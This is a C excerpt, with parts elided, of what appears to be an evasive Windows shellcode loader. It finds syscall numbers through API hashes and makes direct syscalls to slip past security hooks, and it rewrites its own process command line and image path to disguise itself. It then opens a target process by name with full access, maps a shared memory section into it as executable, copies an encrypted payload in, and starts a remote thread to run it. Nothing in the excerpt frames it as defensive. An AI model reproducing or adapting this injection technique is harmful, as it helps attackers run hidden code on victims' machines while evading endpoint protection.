...
void runner(void){
    ...
    GetSyscallList(&List);
    SsnId = 0x00;
    GetSSN(&List, queryinformationprocess_hash, &SsnId);
    s = ZwX(SsnId, ((HANDLE) -1), ProcessBasicInformation, &pbi, sizeof(pbi),&len);
    wchar_t* commandline = CMDLINE;
    pbi.PebBaseAddress->ProcessParameters->CommandLine.Buffer = commandline;
    pbi.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = commandline;
    ...
    dwPID = FindProcByName(X64PROC);
    if (dwPID == -1) { return; }
    pClientID.UniqueProcess = (PVOID)dwPID;
    pClientID.UniqueThread = NULL;
    InitObjAttr(&pObjectAttributes, NULL, NULL, NULL, NULL);
    GetSSN(&List, openprocess_hash, &SsnId);
    if (ZwX(SsnId, &hProcess, PROCESS_ALL_ACCESS, &pObjectAttributes, &pClientID) != STATUS_SUCCESS) { return; }
...
POOP:
    if (!brute) {
        ...
        if (ZwX(SsnId, hSection, NtCurrentProcess(), (void **)&lpbaseaddress, NULL, NULL, NULL, &cbViewSize, 2, NULL, PAGE_READWRITE) != STATUS_SUCCESS) {
            return; 
        }
        GetSSN(&List, mapviewofsection_hash, &SsnId);
        if (ZwX(SsnId, hSection, hProcess, (void **)&rmlpbaseaddress, NULL, NULL, NULL, &cbViewSize, 2, NULL, PAGE_EXECUTE_READ) != STATUS_SUCCESS) {
            return;
        }
        GetSSN(&List, createthreadex_hash, &SsnId);
        memcpy(lpbaseaddress, encrypted_instructions, ENCRYPTED_BIN_LEN); 
        if (ZwX(SsnId, &hThread, 0X1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)rmlpbaseaddress, NULL, FALSE, NULL, NULL, NULL, NULL) != STATUS_SUCCESS) {
            return;
        }
